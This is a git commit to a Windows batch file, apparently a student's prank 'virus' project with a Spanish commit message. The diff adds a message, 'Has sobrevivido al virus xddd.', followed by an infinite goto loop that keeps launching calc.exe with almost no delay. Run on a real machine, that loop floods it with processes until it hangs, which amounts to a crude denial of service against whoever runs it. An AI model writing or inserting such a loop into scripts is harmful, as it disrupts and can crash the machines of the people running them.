b3888acabf20d242414f78a6e3966987dc863ee9
Dpersab1004 <dpersab1004@ieszaidinvergeles.org>
2025-02-12 12:07:13 +0100

    paso 4 calculadora infinita bucle

--- script.bat
+++ script.bat
@@ -6,3 +6,9 @@ for /l %%i in (1,1,%veces%) do (
     start "" "%imagen%"
     ping 127.0.0.1 -n 1 -w 300 >nul
 )
+echo Has sobrevivido al virus xddd.
+:: Bucle infinito para abrir la Calculadora
+:inicio
+start calc.exe
+ping 127.0.0.1 -n 1 >nul
+goto inicio
